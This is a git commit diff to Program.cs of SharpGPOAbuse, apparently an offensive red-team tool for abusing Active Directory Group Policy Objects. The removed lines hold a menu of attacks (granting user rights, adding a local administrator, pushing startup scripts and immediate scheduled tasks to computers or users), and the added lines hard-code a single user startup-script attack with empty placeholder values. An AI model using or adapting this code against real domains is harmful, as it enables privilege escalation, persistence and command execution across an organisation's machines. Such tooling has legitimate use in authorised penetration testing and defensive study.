0c63b3c1bd7bafd46b4870e6b0b6bf36658ebb8e
Rasta Mouse <rasta@rastamouse.me>
2019-10-04 12:03:50 +0100

    Update Program.cs

--- SharpGPOAbuse/Program.cs
+++ SharpGPOAbuse/Program.cs
@@ -7,22 +7,12 @@ namespace SharpGPOAbuse
     {
         static void Main(string[] args)
         {
+            const string ScriptName = "";
+            const string ScriptContent = "";
+            const string GPOName = "";
+
             try
             {
-                string AbuseFunction = args[0];
-
-                string[] UserRights;
-                string UserAccount;
-                string ScriptName;
-                string ScriptContent;
-                string TaskName;
-                string Author;
-                string Command;
-                string CommandArgs;
-
-                string GPOName;
-                bool Force = false;
-
                 Domain currentDomain = Domain.GetCurrentDomain();
                 string DomainController = currentDomain.PdcRoleOwner.Name.ToLower();
                 string DomainName = currentDomain.Name.ToLower();
@@ -41,79 +31,7 @@ namespace SharpGPOAbuse
                 Console.WriteLine($"[+] Domain Controller = {DomainController}");
                 Console.WriteLine($"[+] Distinguished Name = {DistinguishedName}");
 
-                if (AbuseFunction == "AddUserRights")
-                {
-                    UserRights = args[1].Split(',');
-                    UserAccount = args[2];
-                    GPOName = args[3];
-
-                    UserRightAssignment.AddNewRights(DomainName, DomainController, GPOName, DistinguishedName, UserRights, UserAccount);
-                }
-                else if (AbuseFunction == "AddLocalAdmin")
-                {
-                    UserAccount = args[1];
-                    GPOName = args[2];
-
-                    if (!string.IsNullOrEmpty(args[3]))
-                    {
-                        if (args[3] == "Force")
-                            Force = true;
-                    }
-
-                    LocalAdmin.NewLocalAdmin(UserAccount, DomainName, DomainController, GPOName, DistinguishedName, Force);
-                }
-                else if (AbuseFunction == "AddComputerScript")
-                {
-                    ScriptName = args[1];
-                    ScriptContent = args[2];
-                    GPOName = args[3];
-
-                    StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "Computer");
-                }
-                else if (AbuseFunction == "AddUserScript")
-                {
-                    ScriptName = args[1];
-                    ScriptContent = args[2];
-                    GPOName = args[3];
-
-                    StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");
-                }
-                else if (AbuseFunction == "AddComputerTask")
-                {
-                    TaskName = args[1];
-                    Author = args[2];
-                    Command = args[3];
-                    CommandArgs = args[4];
-                    GPOName = args[5];
-
-                    if (!string.IsNullOrEmpty(args[6]))
-                    {
-                        if (args[6] == "Force")
-                            Force = true;
-                    }
-
-                    ScheduledTask.NewImmediateTask(DomainName, DomainController, GPOName, DistinguishedName, TaskName, Author, CommandArgs, Command, Force, "Computer");
-                }
-                else if (AbuseFunction == "AddUserTask")
-                {
-                    TaskName = args[1];
-                    Author = args[2];
-                    Command = args[3];
-                    CommandArgs = args[4];
-                    GPOName = args[5];
-
-                    if (!string.IsNullOrEmpty(args[6]))
-                    {
-                        if (args[6] == "Force")
-                            Force = true;
-                    }
-
-                    ScheduledTask.NewImmediateTask(DomainName, DomainController, GPOName, DistinguishedName, TaskName, Author, CommandArgs, Command, Force, "User");
-                }
-                else
-                {
-                    Console.Error.WriteLine("[!] Invalid attack option");
-                }
+                StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");
             }
             catch (Exception e)
             {
